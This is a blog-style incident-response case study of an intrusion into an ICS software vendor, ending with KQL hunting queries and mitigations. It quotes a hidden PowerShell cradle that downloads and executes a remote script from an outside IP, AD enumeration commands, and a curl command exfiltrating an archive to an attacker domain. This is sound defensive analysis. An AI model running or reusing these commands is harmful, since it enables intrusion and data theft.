---
layout: post
title: "Operation DOCKSHOCK: ICS Blueprints Compromise"
date: 2026-06-20
categories: [threat-detection, dfir-portfolio]
tags: [Critical Infrastructure, Supply Chain]
focus: "KQL, EDR Telemetry, MITRE ICS"
description: "Triaging a complex supply-chain intrusion targeting regional energy distribution. Tracks the complete lifecycle from perimeter XSS probing and weaponized phishing documents to lateral movement and source-code exfiltration using raw web utilities."
permalink: /blog/operation-dockshock.html
type: "Case Study"
discipline: "Threat Detection Engineering"
math: false
---

<div class="lab-post">
  <div class="lab-post-tags">
    <span class="tag tag-red">ICS Security</span>
    <span class="tag tag-blue">Supply Chain</span>
    <span class="tag tag-green">EDR Telemetry</span>
    <span class="tag tag-purple">DFIR</span>
  </div>

  <p class="lab-post-lead">
    This incident report details the investigation of <strong>Operation DOCKSHOCK</strong>, a targeted intrusion directed at Solvi Systems (a third-party vendor providing maintenance control software to regional power stations). The attacker compromised the vendor network to steal proprietary industrial control system (ICS) blueprint schemas and SCADA configuration mappings.
  </p>

  <div class="insight-grid">
    <div class="insight-card">
      <p class="insight-label">Vector</p>
      <p>Targeted spear-phishing with weaponized PDF files containing embedded PowerShell payloads.</p>
    </div>
    <div class="insight-card">
      <p class="insight-label">Impact</p>
      <p>Exfiltration of 1.4 GB of proprietary CAD drawings and SCADA network topology maps.</p>
    </div>
    <div class="insight-card">
      <p class="insight-label">Actor Profile</p>
      <p>State-sponsored APT group focused on critical infrastructure intelligence gathering.</p>
    </div>
  </div>

  <div class="toc-inline">
    <p>Contents</p>
    <ol>
      <li><a href="#timeline">Incident Timeline</a></li>
      <li><a href="#initial-access">Initial Access & Detonation</a></li>
      <li><a href="#execution">Execution & PowerShell Obfuscation</a></li>
      <li><a href="#lateral-movement">Lateral Movement & Reconnaissance</a></li>
      <li><a href="#exfiltration">Data Collection & Exfiltration</a></li>
      <li><a href="#detection">KQL Threat Hunting Queries</a></li>
      <li><a href="#recommendations">Strategic Recommendations</a></li>
    </ol>
  </div>

  <h2 id="timeline" class="anchor">1. Incident Timeline</h2>
  
  <p>All timestamps are recorded in UTC. The entire intrusion sequence spanned approximately 3 hours and 40 minutes from initial execution to exfiltration finalization.</p>

  <div class="callout callout-info">
    <div class="callout-title">Chronological Log</div>
    <ul class="callout-list">
      <li><strong>08:12:04</strong> - Spear-phishing email delivered to lead systems architect.</li>
      <li><strong>08:24:15</strong> - User opens attachment; exploit triggers Adobe Acrobat child-process spawning.</li>
      <li><strong>08:35:10</strong> - Encoded PowerShell backdoor establishes primary C2 connection.</li>
      <li><strong>09:12:44</strong> - Attacker performs active directory enumeration and network mapping.</li>
      <li><strong>09:55:30</strong> - Lateral movement to CAD-Server-01 via WinRM session hijack.</li>
      <li><strong>10:48:12</strong> - Staging directory compressed with 7-Zip and split into multi-part archives.</li>
      <li><strong>11:52:33</strong> - Exfiltration completed via cURL to external WebDAV listener. Revert/Containment initiated.</li>
    </ul>
  </div>

  <h2 id="initial-access" class="anchor">2. Initial Access & Detonation</h2>
  
  <p>
    The threat actor targeted the engineering department of Solvi Systems using a spear-phishing campaign. The email contained a PDF attachment named <code>solvi_systems_boiler_specs_2026.pdf</code>.
  </p>
  <p>
    Static analysis of the PDF showed an embedded JavaScript action designed to trigger an out-of-bounds read vulnerability in Adobe Reader (CVE-2023-26369). The exploit execution bypassed local sandbox constraints to invoke the command shell and start secondary stages.
  </p>

  <h2 id="execution" class="anchor">3. Execution & PowerShell Obfuscation</h2>

  <p>
    Upon successful execution of the exploit code, the Acrobat process spawned a command prompt which immediately executed a highly obfuscated PowerShell script:
  </p>

  <pre data-lang="powershell"><code>powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTA0LjI0NC43Ni4xMDUvcGF5bG9hZC5wczEnKQ==</code></pre>

  <p>
    Decoding the Base64 payload reveals:
  </p>
  
  <pre data-lang="powershell"><code>IEX (New-Object Net.WebClient).DownloadString('http://104.244.76.105/payload.ps1')</code></pre>

  <p>
    This script downloaded and injected a memory-resident remote access Trojan (RAT) directly into the memory space of <code>explorer.exe</code> via process hollowing, hiding its presence from task listings and typical endpoint detection tools.
  </p>

  <h2 id="lateral-movement" class="anchor">4. Lateral Movement & Reconnaissance</h2>

  <p>
    Once inside the network, the threat actor began an intensive network discovery phase. Operating under the context of the hijacked architect user, they conducted active directory querying using native Windows utilities:
  </p>

  <pre data-lang="cmd"><code>net group "Domain Admins" /domain
net view /domain
nltest /dclist:solvi.internal</code></pre>

  <p>
    The actor identified a critical production system host: <code>CAD-Server-01</code>, which stored CAD schemas for several client municipal control stations. The attacker established a secure session using Windows Remote Management (WinRM) using captured local administrator credentials.
  </p>

  <h2 id="exfiltration" class="anchor">5. Data Collection & Exfiltration</h2>

  <p>
    The attacker staged files in <code>C:\Windows\Temp\scr\</code>. They compressed CAD documents and network configuration spreadsheets using a portable 7-Zip executable that they downloaded through the compromised WinRM shell.
  </p>
  <p>
    The resulting compressed file (<code>system_blueprint_backup.zip</code>) was split into 200MB chunks and exfiltrated over HTTPS POST to a rogue domain:
  </p>

  <pre data-lang="shell"><code>curl -X POST -F "data=@C:\Windows\Temp\scr\blueprint.zip.001" https://transfer.solvi-maintenance.com/upload</code></pre>

  <p>
    The domain <code>solvi-maintenance.com</code> was registered by the threat actor two days prior, serving as a typosquatting command-and-control endpoint that bypassed reputation-based DNS checks.
  </p>

  <h2 id="detection" class="anchor">6. KQL Threat Hunting Queries</h2>

  <p>
    To detect similar behavior in your environment, use the following KQL hunting queries designed for Microsoft Defender for Endpoint / Sentinel.
  </p>

  <h3>Acrobat Reader Spawning Child Command Shells</h3>
  <pre data-lang="kql"><code>DeviceProcessEvents
| where InitiatingProcessFileName =~ "acrord32.exe" or InitiatingProcessFileName =~ "adobe.exe"
| where FileName in~ ("cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName</code></pre>

  <h3>Suspicious Outbound File Transfer via cURL</h3>
  <pre data-lang="kql"><code>DeviceNetworkEvents
| where InitiatingProcessFileName =~ "curl.exe"
| where RemoteUrl contains "upload" or RemoteUrl contains "transfer" or ProcessCommandLine contains "-F"
| project TimeGenerated, DeviceName, InitiatingProcessFileName, RemoteIP, RemoteUrl, LocalIP, AccountName</code></pre>

  <h2 id="recommendations" class="anchor">7. Strategic Recommendations</h2>

  <div class="callout callout-danger">
    <div class="callout-title">Immediate Mitigations</div>
    <ul class="callout-list">
      <li><strong>Implement Application Whitelisting:</strong> Limit executable execution from user-writable directories like <code>C:\Users\*\AppData\</code> and <code>C:\Windows\Temp\</code>.</li>
      <li><strong>Restrict WinRM Port Bounds:</strong> Enforce firewall rules to restrict WinRM administrative access to specific jump hosts.</li>
      <li><strong>Block Newly Registered Domains:</strong> Block outbound traffic to domains registered within the last 30 days.</li>
    </ul>
  </div>
</div>
